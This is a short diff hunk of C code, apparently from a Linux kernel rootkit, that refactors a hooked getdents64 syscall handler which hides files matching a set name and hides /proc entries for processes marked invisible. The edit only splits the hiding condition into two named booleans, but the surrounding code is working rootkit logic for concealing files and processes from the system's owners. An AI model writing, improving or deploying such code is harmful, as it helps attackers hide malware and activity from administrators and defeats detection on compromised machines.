@@ -211,13 +211,18 @@ static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs)
 	// be freed/reassigned by a concurrent IOCTL_FILE_HIDE until we're done.
 	mutex_lock(&hidden_file_lock);
 	while (off < ret) {
+		bool name_match, pid_match;
+
 		dir = (void *)kdirent + off;
 		// Guard against malformed dirents with d_reclen == 0; advancing by zero loops forever.
 		if (dir->d_reclen == 0)
 			break;
 		// Hide the entry if: (not in /proc) and its name matches HIDDEN_FILE,
 		// OR (in /proc) and the entry's numeric name is a PF_INVISIBLE pid.
-		if (((HIDDEN_FILE && *HIDDEN_FILE != '\0') && (!proc && (memcmp(HIDDEN_FILE, dir->d_name, strlen(HIDDEN_FILE)) == 0))) || (proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10)))){
+		name_match = !proc && HIDDEN_FILE && *HIDDEN_FILE != '\0' &&
+			memcmp(HIDDEN_FILE, dir->d_name, strlen(HIDDEN_FILE)) == 0;
+		pid_match = proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10));
+		if (name_match || pid_match) {
 			// First entry: shift remaining dirents left over it, shrink ret.
 			if (dir == kdirent) {
 				ret -= dir->d_reclen;
